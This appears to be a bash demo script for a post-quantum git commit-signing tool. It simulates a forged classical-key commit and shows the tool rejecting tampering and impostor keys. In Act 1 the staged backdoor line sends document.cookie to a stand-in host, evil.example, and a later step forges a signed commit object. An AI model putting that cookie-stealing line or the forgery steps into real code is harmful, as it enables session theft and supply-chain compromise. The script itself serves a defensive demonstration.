#!/usr/bin/env bash
# Q-Day attack demo: what a leaked classical signing key does to git today, and why Qommit stops it.
#
#   ./demo/qday-attack.sh            (DEMO_PAUSE=0 to run without pauses)
#
# Act 1 runs locally with a normal SSH signing key. Act 2 uses this repository's real, quantum-signed commits and
# a live identity lookup on QoreChain testnet. Act 3 sends a real (rejected) transaction to QoreChain testnet and
# needs contracts/.env (skipped if absent).
set -euo pipefail

ROOT="$(cd "$(dirname "$0")/.." && pwd)"
QOMMIT="node $ROOT/cli/bin/qommit.mjs"
PAUSE="${DEMO_PAUSE:-1.5}"
WORK="$(mktemp -d)"
trap 'rm -rf "$WORK"' EXIT

B=$'\e[1m'; R=$'\e[31m'; G=$'\e[32m'; Y=$'\e[33m'; C=$'\e[36m'; D=$'\e[2m'; X=$'\e[0m'
say() { printf '\n%s\n' "$*"; sleep "$PAUSE"; }
act() { printf '\n%s━━━ %s ━━━%s\n' "$B$C" "$*" "$X"; sleep "$PAUSE"; }
run() { printf '%s$ %s%s\n' "$D" "$*" "$X"; eval "$@"; sleep "$PAUSE"; }
gitq() { git -c init.defaultBranch=main -c advice.defaultBranchName=false "$@"; }

# ─────────────────────────────────────────────────────────────────────────────
act "ACT 1 · Today: classical commit signing (SSH / Ed25519)"
mkdir -p "$WORK/alice" "$WORK/repo" && cd "$WORK/repo" && gitq init -q
ssh-keygen -q -t ed25519 -N "" -C alice@example.com -f "$WORK/alice/id_ed25519"
echo "alice@example.com $(cat "$WORK/alice/id_ed25519.pub")" > "$WORK/allowed_signers"
git config user.name "Alice (maintainer)"; git config user.email alice@example.com
git config gpg.format ssh; git config user.signingkey "$WORK/alice/id_ed25519"
git config gpg.ssh.allowedSignersFile "$WORK/allowed_signers"

say "Alice, a trusted maintainer, signs her commit:"
echo "login()" > app.js && git add app.js
run 'git commit -q -S -m "Add login page" && git log --show-signature -1 --format="  %s" 2>&1 | grep -E "Good|  "'

act "Q-DAY · A quantum computer breaks Ed25519"
say "${Y}Alice's PUBLIC key is, well, public. With Shor's algorithm a quantum computer derives the PRIVATE key from it.${X}"
say "${D}(simulated: we hand Alice's private key to the attacker)${X}"
mkdir -p "$WORK/attacker" && cp "$WORK/alice/id_ed25519" "$WORK/attacker/stolen_key"

say "${R}The attacker forges a commit as Alice and slips in a backdoor:${X}"
git config user.signingkey "$WORK/attacker/stolen_key"
echo 'login(); fetch("https://evil.example/steal?c=" + document.cookie)' > app.js && git add app.js
run 'git commit -q -S -m "Improve login performance" && git log --show-signature -1 --format="  %s" 2>&1 | grep -E "Good|  "'
say "${R}${B}Git says GOOD. GitHub would show \"Verified\". Nobody can tell the forgery apart. Every classical signature in history is now worthless.${X}"

# ─────────────────────────────────────────────────────────────────────────────
act "ACT 2 · With Qommit: ML-DSA-87 signatures + identity on QoreChain"
export QOMMIT_HOME="$WORK/stranger"   # the verifier: no keys and no trust list, only the chain
gitq clone -q --no-checkout "$ROOT" "$WORK/qommit" && cd "$WORK/qommit"
git config gpg.x509.program "$ROOT/cli/bin/qommit.mjs"

say "A real commit from the Qommit repository, checked by a total stranger:"
run "git verify-commit HEAD 2>&1 | sed 's/^/  /'"

say "${R}Attack 1: take that signed commit and change what it says${X}"
# keep the signature, change the commit message (first line after the header's blank line)
git cat-file -p HEAD | awk 'm==1 { print $0 " + backdoor"; m=2; next } /^$/ && m==0 { m=1 } { print }' > "$WORK/forged.txt"
FORGED=$(git hash-object -t commit -w "$WORK/forged.txt")
run "git verify-commit ${FORGED:0:7} 2>&1 | sed 's/^/  /' || true"

ALICE_ID="$(git log -1 --format=%GS HEAD 2>/dev/null || true)"
ALICE_ID="${ALICE_ID:-qor1jcy2zxezq40rk7jdx540mc3gd89tqlnpgcu767}"
say "${R}Attack 2: make a brand-new post-quantum key and claim to be ${ALICE_ID}${X}"
mkdir -p "$WORK/evil" && cd "$WORK/evil" && gitq init -q
git config user.name "Alice (maintainer)"; git config user.email alice@example.com
QOMMIT_HOME="$WORK/attacker/qommit" $QOMMIT init --address "$ALICE_ID" > /dev/null
echo 'backdoor()' > app.js && git add app.js
QOMMIT_HOME="$WORK/attacker/qommit" git commit -q -m "Improve login performance"
run "git -c gpg.minTrustLevel=fully verify-commit HEAD 2>&1 | sed 's/^/  /' || true"
say "${G}The claim isn't backed by an on-chain link from ${ALICE_ID}, so it isn't trusted.${X}"

# ─────────────────────────────────────────────────────────────────────────────
act "ACT 3 · Can the attacker fake the on-chain link with a leaked classical wallet key?"
if [ -f "$ROOT/contracts/.env" ]; then
  (cd "$ROOT/contracts" && pnpm -s qday-attack 2>&1 | sed 's/^/  /')
else
  say "${D}(skipped: needs contracts/.env with a testnet account)${X}"
fi
sleep "$PAUSE"

# ─────────────────────────────────────────────────────────────────────────────
act "RESULT"
printf '  %-46s %s\n' "Forged commit, classical signing (Act 1)" "${R}✅ \"Good\": undetectable${X}"
printf '  %-46s %s\n' "Tampered Qommit commit (Act 2)" "${G}❌ BAD signature${X}"
printf '  %-46s %s\n' "Impostor post-quantum key (Act 2)" "${G}⚠️  not linked, rejected${X}"
printf '  %-46s %s\n' "Forged on-chain link, classical key (Act 3)" "${G}🛡️  refused by QoreChain${X}"
printf '\n  %sSign today with keys that survive tomorrow:%s npm install -g qommit-cli\n\n' "$B" "$X"
